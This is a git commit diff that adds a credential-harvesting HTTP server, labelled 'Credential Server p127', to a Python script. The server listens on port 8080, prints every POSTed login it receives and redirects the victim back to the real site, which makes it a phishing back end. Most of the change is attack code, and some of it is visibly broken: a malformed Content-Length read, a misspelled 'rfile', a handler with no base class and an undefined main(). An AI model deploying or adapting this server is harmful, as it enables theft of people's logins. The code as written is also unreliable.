365f0d58fc5ba30c3adf00fe6601906792b909b5
n1cfury <fukugetin@gmail.com>
2017-02-19 18:28:36 -0800

    Code completed. DEBUG and TEST

--- credServer.py
+++ credServer.py
@@ -1,12 +1,20 @@
-
+import SimpleHTTPServer, SocketServer, urllib
 
 def banner():
-	print ""
-
-
-def wait_for_browser(browser):
+	print "[***]   Credential Server p127   [***}"
 
 class CredRequestHandler():
+	def do_POST(self):
+		content_length = int(self, headers['Content-Length'])
+		creds = self.rifle.read(content_length).decode('utf-8')
+		print creds
+		site = self.path[1:]
+		self.send_response(301)
+		self.send_header('Location', urllib.unquote(site))
+		self.end_headers()
+
+server= SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
+server.serve_forever()
 
 if __name__ == '__main__':
 	main()
